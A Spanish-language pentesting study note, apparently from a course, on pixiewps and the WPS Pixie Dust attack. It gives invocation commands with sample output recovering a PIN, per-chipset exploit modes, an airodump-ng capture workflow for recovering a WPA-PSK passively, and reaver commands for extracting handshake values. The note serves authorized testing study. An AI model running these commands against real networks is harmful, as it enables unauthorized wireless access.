---
tags:
  - Wi-Fi/WPS
  - Pentesting/Explotacion
Descripción: "El motor del ataque Pixie Dust: modos por chipset, invocación directa con valores capturados y la recuperación de PSK desde captura pasiva"
Fecha de actualización: 2026-08-01
Nota previa: "[[01 - Bully]]"
Nota siguiente: "[[03 - OneShot y el estado del arte]]"
Area: "[[Reaver.base|Reaver]]"
---
---

<mark style="background: #ADCCFFA6;">`pixiewps` es el motor de cálculo del ataque Pixie Dust</mark>. No habla con ninguna red: recibe los valores de un intercambio WPS y recupera el PIN offline explotando la baja entropía de los nonces `E-S1` y `E-S2`. [[00 - Reaver y wash|`reaver -K`]] y [[01 - Bully|`bully -d`]] lo invocan internamente; se puede usar suelto cuando ya se tienen los datos.

Lo escribió **wiire-a** implementando el ataque que [Dominique Bongard](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf) presentó en 2014. El repositorio [wiire-a/pixiewps](https://github.com/wiire-a/pixiewps) sigue activo (cambios en abril de 2026), aunque la última release etiquetada es la **1.4.2 de enero de 2018**.

# Invocación directa

```shell-session
$ pixiewps -e <PKe> -r <PKr> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>

 Pixiewps 1.4.2

 [*] E-S1:    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
 [*] E-S2:    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
 [+] WPS pin: 32552273

 [*] Time taken: 0 s 34 ms
```

| Opción | Valor | Origen |
| ------ | ----- | ------ |
| `-e, --pke` | Clave pública DH del Enrollee | M1 |
| `-r, --pkr` | Clave pública DH del Registrar | M2 (lo genera el atacante) |
| `-s, --e-hash1` | `E-Hash1` | M3 |
| `-z, --e-hash2` | `E-Hash2` | M3 |
| `-a, --authkey` | Clave de autenticación derivada | Calculada |
| `-n, --e-nonce` | Nonce del Enrollee | M1 |
| `-m, --r-nonce` | Nonce del Registrar | M2 |
| `-b, --e-bssid` | BSSID del AP | — |
| `-S, --dh-small` | Usar claves DH pequeñas (acelera) | — |
| `--mode N[,N]` | Modos a probar. Por defecto todos | — |
| `-f, --force` | Búsqueda exhaustiva de la semilla | — |

La columna «Origen» remite a los mensajes del *registration protocol*: qué lleva cada uno está en [[01 - El protocolo de registro y la anatomía del PIN]], y por qué esos valores bastan para resolver el PIN sin la clave, en [[07 - Pixie Dust y el fallo de entropía]].

# Los modos

Cada modo corresponde a un patrón de fallo del generador de números aleatorios:

| Modo | Chipsets | Fallo explotado |
| ---- | -------- | --------------- |
| **1** | Ralink, MediaTek, Celeno | `E-S1` y `E-S2` valen **cero** |
| **2** | eCos (variante simple) | PRNG con estado reconstruible |
| **3** | **Realtek RTL819x** | Semilla derivada del timestamp Unix |
| **4** | eCos (variante mínima) | PRNG trivial |
| **5** | eCos (Knuth) | LCG de Knuth |

Por defecto prueba todos (`[Auto]`), lo que cuesta milisegundos. Acotar con `--mode` sólo tiene sentido al depurar o al procesar muchas capturas en lote.

<mark style="background: #FFB86CA6;">El modo que acierta identifica el chipset del AP</mark>, dato que merece la pena anotar: permite al cliente buscar el mismo modelo en otras sedes.

# Recuperar la PSK de una captura pasiva

> [!important]+ La capacidad que HTB no menciona
> Desde la **versión 1.4**, `pixiewps` puede recuperar la **`WPA-PSK` directamente de una captura pasiva completa** de un registro WPS legítimo —mensajes M1 a M7— en los dispositivos que funcionan con `--mode 3` ([README del proyecto](https://github.com/wiire-a/pixiewps)).
>
> <mark style="background: #8000E1A6;">No hace falta interactuar con el AP en absoluto</mark>. Si un empleado conecta una impresora por WPS mientras se está capturando el canal, la contraseña de la red cae sin haber transmitido una sola trama. En un engagement con presencia física prolongada, dejar un `airodump-ng` fijo en el canal del AP objetivo es una apuesta barata.

El flujo:

```shell-session
$ sudo airodump-ng -c 1 --bssid <BSSID> -w wps_capture mon0
# … esperar a que alguien use WPS …
$ pixiewps --mode 3 -f ... # con los valores extraídos de la captura
```

Los valores se extraen del `.cap` filtrando el intercambio EAP-WPS en Wireshark:

```text
eapol || (wlan.fc.type_subtype == 0 && eap)
```

# Obtener los valores desde reaver

Cuando se quiere separar la captura del cálculo —por ejemplo, para calcular en otra máquina con más potencia o desde otra ubicación:

```shell-session
$ sudo reaver -i mon0 -b <BSSID> -c <canal> -vvv -K -O intercambio.pcap
```

`-vvv` imprime `PKe`, `PKr`, los hashes y la `AuthKey` en pantalla, y `-O` guarda las tramas. Con eso, `pixiewps` se puede ejecutar después y en otro sitio.

# Cuando no encuentra el PIN

```text
[-] WPS pin not found!
```

Causas, por frecuencia:

1. **El chipset no es vulnerable.** El firmware genera nonces con entropía real. Es el caso más común en equipamiento reciente.
2. **Valores incompletos o mal copiados.** Un byte mal transcrito da el mismo resultado que un AP no vulnerable. Verificar longitudes: `PKe` y `PKr` son 192 bytes, los hashes 32, los nonces 16.
3. **El intercambio no llegó a M3.** Sin `E-Hash1` y `E-Hash2` no hay nada que calcular. Suele deberse a señal insuficiente.
4. **Modo no cubierto.** Con `-f` se fuerza una búsqueda exhaustiva de la semilla, mucho más lenta pero que a veces encuentra lo que el modo automático descarta.

# Rendimiento

| Modo | Tiempo típico |
| ---- | ------------- |
| 1 (nonce cero) | Milisegundos |
| 3 (Realtek) | Segundos a minutos |
| 2, 4, 5 (eCos) | Segundos |
| `-f` exhaustivo | Minutos a horas |

<mark style="background: #FFB8EBA6;">La opción `-S` (claves DH pequeñas) acelera el cálculo</mark>, pero exige que el **intercambio** se haya hecho con esa configuración: cambia lo que se negocia en el aire, no sólo cómo se calcula después.

> [!important]+ Cómo invoca reaver a pixiewps realmente
> Verificado en [`src/pixie.c`](https://github.com/t6x/reaver-wps-fork-t6x/blob/master/src/pixie.c) y `src/argsparser.c`, porque el detalle cambia el comando que hay que reproducir a mano:
>
> ```c
> snprintf(ptd.cmd, ..., "pixiewps %s-e %s -s %s -z %s -a %s -n %s %s %s",
>     (p->use_uptime ? uptime_str : ""),          // "-u <uptime>" si se pasó -u
>     p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce,
>     dh_small ? "-S" : "-r", dh_small ? "" : p->pkr);
> ```
>
> Tres consecuencias:
>
> - **`reaver -K` no activa `-S` por defecto.** Sólo lo hace si se pasa `-S` explícitamente, y entonces invoca `pixiewps -S` **omitiendo `-r <PKr>`** (con claves pequeñas, pixiewps deriva `PKr` por su cuenta). Sin `-S`, pasa `-r <PKr>`.
> - **`-K` fija además `max_pin_attempts` a 1**: reaver hace un único intercambio y sale. Es la razón técnica de que Pixie Dust no dispare el bloqueo por intentos.
> - **`-u` es una opción aparte** que pasa el *uptime* del AP a `pixiewps`. <mark style="background: #FF5582A6;">Hace falta para el modo 3 (Realtek)</mark>, donde la semilla se deriva del reloj: sin `-u`, ese modo puede fallar aunque el AP sea vulnerable.

La ejecución completa dentro del flujo de ataque está en [[08 - Ejecución del ataque Pixie Dust]].
